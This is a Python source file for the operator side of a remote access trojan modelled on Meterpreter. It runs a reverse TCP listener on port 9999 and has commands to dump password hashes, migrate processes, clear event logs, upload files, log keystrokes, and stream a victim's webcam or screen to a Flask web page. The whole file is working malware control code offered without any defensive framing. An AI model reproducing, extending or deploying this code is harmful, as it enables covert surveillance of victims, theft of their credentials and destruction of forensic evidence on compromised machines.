import socket
import threading
import time
from flask import Flask, Response, render_template_string, request, redirect, url_for
from colorama import Fore, init
import cv2
import numpy as np
import keyboard
from datetime import datetime

init(autoreset=True)

app = Flask(__name__)
clients = {}
server_thread = None
streaming = False
keylogger_data = []
keylogger_running = False

html_template = """
<!doctype html>
<html lang="en">
  <head>
    <title>Video Streaming</title>
  </head>
  <body>
    <h1>Video Streaming</h1>
    <div>
      <p><strong>Target IP :</strong> {{ target_ip }}</p>
      <p><strong>Start Time :</strong> {{ start_time }}</p>
    </div>
    <div>
      <img src="{{ url_for('video_feed') }}" width="640" height="480">
    </div>
    <div>
      <a href="{{ url_for('stop_streaming') }}">
        <button>Stop Streaming</button>
      </a>
    </div>
  </body>
</html>
"""

def start_streaming(client_socket, mode, client_id):
    global streaming
    streaming = True
    target_ip = client_id.split(":")[0]
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(Fore.BLUE + "[ * ] Starting streaming session...")
    time.sleep(1)
    print(Fore.BLUE + "[ * ] Preparing player...")
    time.sleep(1)

    @app.route('/')
    def index():
        return render_template_string(html_template, target_ip=target_ip, start_time=start_time)

    @app.route(f'/video_feed_{client_id}')
    def video_feed():
        return Response(generate_frames(client_socket, client_id),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    @app.route('/stop_streaming')
    def stop_streaming():
        global streaming
        streaming = False
        print(Fore.RED + "[ * ] Stopping streaming...")
        try:
            client_socket.close()
        except Exception as e:
            print(Fore.RED + f"[ * ] Error closing client socket: {e}")
        return redirect(url_for('index'))

    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
    print(Fore.BLUE + "[ * ] Streaming...")

    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()

def generate_frames(client_socket, client_id):
    global streaming
    while streaming:
        data = client_socket.recv(921600)
        if not data:
            break
        frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

def keylogger_callback(event):
    global keylogger_data
    keylogger_data.append(event.name)

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print(Fore.YELLOW + "[ * ] Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print(Fore.YELLOW + "[ * ] Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    filtered_data = []
    skip_keys = {"left shift", "right shift", "shift"}
    for key in keylogger_data:
        if key in skip_keys:
            continue
        if key == "space":
            filtered_data.append(" ")
        elif key == "backspace":
            filtered_data.append("[backspace]")
        elif key == "enter":
            filtered_data.append("[enter]")
        else:
            filtered_data.append(key)
    return ''.join(filtered_data)

def handle_client(client_socket, addr):
    target_ip, target_port = addr
    client_id = f"{target_ip}:{target_port}"
    print(Fore.GREEN + f"[ * ] Session started for {client_id}")

    clients[client_id] = {'socket': client_socket, 'streaming': False, 'keylogger_data': []}

    while True:
        try:
            command = input(Fore.MAGENTA + f"metercrack ({client_id}) > ")
        except EOFError:
            break

        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
        client_socket.send(command.encode('utf-8'))

        if command == "hashdump":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "migrate":
            print(Fore.YELLOW + "[ * ] Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "clearev":
            print(Fore.YELLOW + "[ * ]  Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "upload":
            print(Fore.YELLOW + "[ * ]  Starting...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + response)

        elif command == "keyscan_start":
            start_keylogger()
            continue

        elif command == "keyscan_stop":
            stop_keylogger()
            continue

        elif command == "keyscan_dump":
            print(Fore.WHITE + dump_keylogger_data())
            continue

        elif command.startswith("webcam_stream") or command.startswith("screenshare"):
            mode = "webcam" if "webcam" in command else "screenshare"
            start_streaming(client_socket, mode, client_id)
            continue
        
        elif command.startswith("webcam_list"):
            print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
            client_socket.send(command.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
    print(Fore.GREEN + "[ * ] Listening for incoming connections...")

    while True:
        client_socket, addr = server_socket.accept()
        print(Fore.GREEN + f"[ * ] Connection established from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
